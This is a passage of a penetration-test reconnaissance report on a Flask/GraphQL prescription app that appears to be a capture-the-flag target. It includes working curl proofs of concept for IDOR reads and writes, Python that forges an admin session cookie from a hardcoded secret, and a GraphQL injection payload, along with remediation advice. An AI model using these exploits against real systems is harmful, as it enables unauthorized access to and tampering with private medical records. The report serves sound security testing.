    return Prescription.query.filter_by(user_id=user_id).all()
```

**Proof of Concept:**
```bash
# Unauthenticated attack (no login required):
curl -X POST http://localhost:5003/api \
  -H "Content-Type: application/json" \
  -d '{"query":"query { getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }"}'

# Response includes all admin prescriptions:
# - 89 prescriptions total
# - Prescription #43 contains FLAG value
```

**Data Exposure:**
- All prescription details for any user
- FLAG field in prescription #43 (admin's prescriptions)
- User IDs, prescription IDs
- Complete database dump possible by iterating user_ids

**Detailed IDOR-002 (Horizontal Escalation via addPrescription):**

**Vulnerability Code:**
```python
# /app/app.py lines 54-58
def mutate(self, info, user_id, prescription_details):
    new_prescription = Prescription(user_id=user_id, prescription_details=prescription_details)
    db.session.add(new_prescription)
    db.session.commit()
    return AddPrescription(prescription=new_prescription)
```

**Proof of Concept:**
```bash
# Create prescription for admin (user_id=1) without being admin:
curl -X POST http://localhost:5003/api \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { addPrescription(userId: 1, prescriptionDetails: \"Attacker-controlled prescription\") { prescription { id userId prescriptionDetails } } }"}'
```

**Impact:**
- Data poisoning - create fake prescriptions under any user account
- Storage DoS - fill database with junk data
- Integrity compromise - admin sees attacker-created prescriptions

### 8.2 Vertical Privilege Escalation Candidates

**CRITICAL FINDING:** No vertical escalation opportunities exist because **no privilege hierarchy exists**.

The application has no elevated privileges to escalate to:
- No admin-only endpoints
- No admin-specific functionality
- No role checks anywhere in code
- "admin" username has no special capabilities

**Hypothetical Vertical Escalation Targets (if roles existed):**

| Target Role | Endpoint Pattern | Functionality | Risk Level | Current Status |
|-------------|------------------|---------------|------------|----------------|
| admin | `/admin/*` | Administrative panel | N/A | **DOES NOT EXIST** |
| admin | `/api/admin/users` | User management | N/A | **DOES NOT EXIST** |
| admin | `/api/admin/prescriptions` | View all prescriptions | N/A | **ACHIEVABLE WITHOUT ADMIN ROLE via IDOR** |
| admin | `/admin/settings` | System configuration | N/A | **DOES NOT EXIST** |
| admin | `/admin/reports` | Analytics/reporting | N/A | **DOES NOT EXIST** |

**Key Point:** The IDOR vulnerabilities already provide "admin-equivalent" access:
- Any user can read all prescriptions (including admin's)
- Any user can create prescriptions for any account
- No functionality is restricted to admin role

**Vertical Escalation via Session Forgery:**

While not a traditional vertical escalation, an attacker can impersonate the admin account:

**Attack:** Use hardcoded secret key to forge session cookie
- **Secret:** `@#$%^R&GYUIUBJIU#@*DF&G*H` (`/app/app.py:9`)
- **Target:** user_id=1 (admin account)
- **Method:**
  ```python
  from flask.sessions import SecureCookieSessionInterface
  import itsdangerous
  
  secret_key = '@#$%^R&GYUIUBJIU#@*DF&G*H'
  serializer = SecureCookieSessionInterface().get_signing_serializer(secret_key)
  forged_session = serializer.dumps({'_user_id': '1'})
  # Use forged_session as session cookie value
  ```
- **Impact:** Full account takeover of admin account
- **Risk Level:** CRITICAL

### 8.3 Context-Based Authorization Candidates

**FINDING:** No multi-step workflows exist that enforce state progression.

The application has a simple, stateless design:
- Login → Access any protected page
- No onboarding flows
- No multi-step forms
- No wizard-style processes
- No workflow state tracking

**Potential Context Bypasses (if workflows existed):**

| Workflow | Endpoint | Expected Prior State | Bypass Potential | Current Status |
|----------|----------|---------------------|------------------|----------------|
| Prescription Creation | `/api` (addPrescription) | User authentication | N/A | **NO AUTHENTICATION REQUIRED** |
| Prescription Viewing | `/api` (getPrescriptions) | User authentication + ownership | N/A | **NO AUTHENTICATION OR OWNERSHIP CHECKS** |
| Login Flow | `/add_prescription` | POST to /login first | Low | Redirects to login if not authenticated (works correctly) |

**GraphQL State Bypass:**

The GraphQL API has no concept of workflow state:
- No transaction management
- No state machine for operations
- Each operation is independent and stateless
- No checks for prerequisite operations

**Example (Theoretical):**
If the application had a "prescription approval workflow":
1. Doctor creates prescription (addPrescription)
2. Pharmacist reviews prescription (reviewPrescription)
3. Patient picks up prescription (fulfillPrescription)

In such a workflow, an attacker could call `fulfillPrescription` without steps 1-2 being completed, because GraphQL mutations are independent.

**Current Reality:** The application is too simple to have workflow bypasses. All operations are atomic and independent.

**Session Fixation (Context-Based):**

- **Issue:** No session regeneration on login
- **Code:** `/app/app.py:77` - `login_user(user)` does not force new session ID
- **Attack:** Attacker sets victim's session cookie before authentication, then gains access after victim logs in
- **Impact:** Session hijacking
- **Severity:** Medium (requires attacker to set victim's cookie)

## 9. Injection Sources (Command Injection and SQL Injection)

**Network Surface Focus:** Only injection sources reachable through the web application on port 5003 are analyzed. Database initialization scripts (init_db function) and Docker build processes are excluded.

### SQL Injection Analysis

**FINDING:** **NO SQL INJECTION VULNERABILITIES FOUND**

The application uses SQLAlchemy ORM exclusively with parameterized queries. All user input flows through ORM methods that automatically parameterize SQL.

#### Analyzed SQL Injection Candidates:

**1. Login Username Query**
- **Location:** `/app/app.py:75`
- **Code:** `User.query.filter_by(username=data['username']).first()`
- **Data Flow:**
  - Entry: POST /login → `request.json['username']`
  - Sink: SQLAlchemy filter_by() method
  - Generated SQL: `SELECT * FROM user WHERE username = ? LIMIT 1`
- **User Control:** Fully user-controlled input
- **Safety Mechanism:** SQLAlchemy parameterized query
- **Exploitability:** **NOT EXPLOITABLE**

**2. GraphQL getPrescriptions Query**
- **Location:** `/app/app.py:45`
- **Code:** `Prescription.query.filter_by(user_id=user_id).all()`
- **Data Flow:**
  - Entry: POST /api → GraphQL query parameter `userId`
  - Type Check: `graphene.Int(required=True)` - coerced to integer
  - Sink: SQLAlchemy filter_by() method
  - Generated SQL: `SELECT * FROM prescription WHERE user_id = ?`
- **User Control:** Fully user-controlled (GraphQL parameter)
- **Safety Mechanism:** GraphQL type validation + SQLAlchemy parameterization
- **Exploitability:** **NOT EXPLOITABLE**

**3. GraphQL addPrescription Mutation**
- **Location:** `/app/app.py:55-57`
- **Code:**
  ```python
  new_prescription = Prescription(user_id=user_id, prescription_details=prescription_details)
  db.session.add(new_prescription)
  db.session.commit()
  ```
- **Data Flow:**
  - Entry: POST /api → GraphQL mutation arguments `userId`, `prescriptionDetails`
  - Type Check: `graphene.Int()` and `graphene.String()`
  - Sink: SQLAlchemy ORM object creation
  - Generated SQL: `INSERT INTO prescription (user_id, prescription_details) VALUES (?, ?)`
- **User Control:** Fully user-controlled (both parameters)
- **Safety Mechanism:** SQLAlchemy ORM parameterized insert
- **Exploitability:** **NOT EXPLOITABLE**

**4. User Loader Query**
- **Location:** `/app/app.py:33`
- **Code:** `db.session.get(User, int(user_id))`
- **Data Flow:**
  - Entry: Session cookie (Flask-Login managed)
  - Type Cast: `int(user_id)`
  - Sink: SQLAlchemy session.get() method
  - Generated SQL: `SELECT * FROM user WHERE id = ?`
- **User Control:** Indirectly controlled via session (requires secret key)
- **Safety Mechanism:** Type casting + SQLAlchemy parameterization
- **Exploitability:** **NOT EXPLOITABLE**

#### SQL Injection Search Results:

**Patterns Searched:**
- Raw SQL: `db.execute()`, `db.engine.execute()`, `connection.execute()`
- Text queries: `text()`, `textual_sql`, raw_sql
- String formatting: `.format()`, `%s`, `%d`, f-strings in SQL context
- String concatenation: `+` operator with SQL strings

**Result:** **NONE FOUND**

All database operations use:
- SQLAlchemy ORM methods (query.filter_by(), session.get(), session.add())
- Automatic parameterization
- No raw SQL strings
- No string concatenation in queries

### Command Injection Analysis

**FINDING:** **NO COMMAND INJECTION VULNERABILITIES FOUND**

The application does not execute any shell commands or use subprocess modules with user-controllable input.

#### Analyzed Command Injection Candidates:

**Patterns Searched:**
- `os.system()`
- `os.popen()`
- `subprocess.call()`, `subprocess.run()`, `subprocess.Popen()`
- `commands.getoutput()`, `commands.getstatusoutput()`
- `eval()`, `exec()` with user input
- `shell=True` parameter

**Result:** **NONE FOUND in network-accessible code**

#### os Module Usage Analysis:

**Only os Module Usage Found:**

**1. Environment Variable Read (NOT A VULNERABILITY)**
- **Location:** `/app/app.py:125`
- **Code:** `flag = os.getenv('FLAG', 'flag{this_is_a_fake_flag}')`
- **Context:** Database initialization function `init_db()` (lines 106-138)
- **Network Accessibility:** **NOT NETWORK-ACCESSIBLE**
  - Runs only at application startup (line 142: `if __name__ == '__main__'`)
  - Executed before `app.run()`
  - Not triggered by HTTP requests
- **User Input:** None - reads environment variable only
- **Function:** `os.getenv()` - reads environment, does NOT execute commands
- **Safety:** SAFE - No command execution, no user input
- **Exploitability:** **NOT EXPLOITABLE**

**2. os Import Statement**
- **Location:** `/app/app.py:6`
- **Code:** `import os`
- **Purpose:** Only used for `os.getenv()` in init_db()
- **No Command Execution:** The os module is imported but never used to execute commands

### GraphQL Injection Analysis

**FINDING:** **GRAPHQL INJECTION VULNERABILITY FOUND**

**Location:** `/app/templates/add_prescription.html:24`

**Vulnerability Type:** GraphQL injection via string interpolation

**Vulnerable Code:**
```javascript
body: JSON.stringify({
    query: `
        mutation {
            addPrescription(userId: ${userID}, prescriptionDetails: "${prescriptionDetails}") {
                prescription {
                    id
                    userId
                    prescriptionDetails
                }
            }
        }
    `,
}),
```

**Data Flow:**
1. **Entry Point:** HTML input field for prescription details
   - `document.getElementById('prescriptionDetails').value`
2. **Processing:** None - no sanitization or escaping
3. **Sink:** Direct string interpolation into GraphQL mutation query (line 24)
4. **User Control:** Fully user-controlled input

**Injection Mechanism:**
User input is interpolated directly into the GraphQL query string using template literals. If user includes a double quote (`"`), they can break out of the string context and inject arbitrary GraphQL syntax.

**Proof of Concept:**
```javascript
// User inputs:
prescriptionDetails = '" } prescription { flag } } { getPrescriptions(userId:1) { flag'

// Resulting query becomes:
mutation {
    addPrescription(userId: 1, prescriptionDetails: "" } prescription { flag } } { getPrescriptions(userId:1) { flag") {
        prescription {
            id
            userId
            prescriptionDetails
        }
    }
}
```

This malformed query could be used to:
- Extract additional fields (like `flag`)
- Execute multiple operations in one request
- Bypass query structure validation

**Impact:**
- Information disclosure - extract hidden fields
- Query structure manipulation
- Combined with IDOR, can extract sensitive data

**Exploitability:** MEDIUM
- Requires user authentication (template is on protected page)
- GraphQL server may reject malformed queries
- Limited by GraphQL parser's error handling

**Proper Fix:**
```javascript
// Use GraphQL variables instead of string interpolation
body: JSON.stringify({
    query: `
        mutation($userId: Int!, $details: String!) {
            addPrescription(userId: $userId, prescriptionDetails: $details) {
                prescription { id userId prescriptionDetails }
            }
        }
    `,
    variables: {
        userId: userID,
        details: prescriptionDetails
    }
}),
```

### Summary Table: Injection Source Analysis

| Injection Type | Sources Found | Exploitable | Locations |
|----------------|---------------|-------------|-----------|
| **SQL Injection** | 0 | No | All database operations use SQLAlchemy ORM with parameterized queries |
| **Command Injection** | 0 | No | No subprocess/os.system usage in network-accessible code |
| **GraphQL Injection** | 1 | Partially | `/app/templates/add_prescription.html:24` - String interpolation in query construction |

### Complete Data Flow Paths (No Injection Sinks Found):

**Flow 1: Login → Database**
1. POST /login → `request.json['username']` (/app/app.py:74)
2. SQLAlchemy filter_by() → Parameterized query (/app/app.py:75)
3. **Result:** SAFE

**Flow 2: GraphQL Query → Database**
1. POST /api → GraphQL `userId` parameter (client: /app/templates/view_prescriptions.html:26)
2. GraphQL type coercion to Int (/app/app.py:42)
3. SQLAlchemy filter_by() → Parameterized query (/app/app.py:45)
4. **Result:** SAFE from SQLi (but IDOR vulnerability exists)

**Flow 3: GraphQL Mutation → Database**
1. POST /api → GraphQL `prescriptionDetails` parameter (client: /app/templates/add_prescription.html:24)
2. **GraphQL Injection:** String interpolation (line 24)
3. GraphQL type coercion to String (/app/app.py:50)
4. SQLAlchemy ORM insert → Parameterized query (/app/app.py:55-57)
5. **Result:** SAFE from SQLi, but GraphQL injection in client-side query construction

### Conclusion

**Command Injection Sources:** **0**  
**SQL Injection Sources:** **0**  
**GraphQL Injection Sources:** **1** (client-side query construction)

The application demonstrates secure database interaction patterns through consistent use of SQLAlchemy ORM's parameterized queries. No command execution with user input exists in network-accessible code paths.

**However**, a GraphQL injection vulnerability exists in client-side query construction via string interpolation. This should be remediated by using GraphQL variables instead of template literals.

**Recommendation for Subsequent Analysis Phases:**
- **Injection Analysis Specialist:** Focus on GraphQL injection in `/app/templates/add_prescription.html:24` and evaluate if it can be exploited to extract the FLAG or execute unauthorized operations.
- **XSS Analysis Specialist:** Examine the same string interpolation patterns for cross-site scripting opportunities.

---

## END OF RECONNAISSANCE DELIVERABLE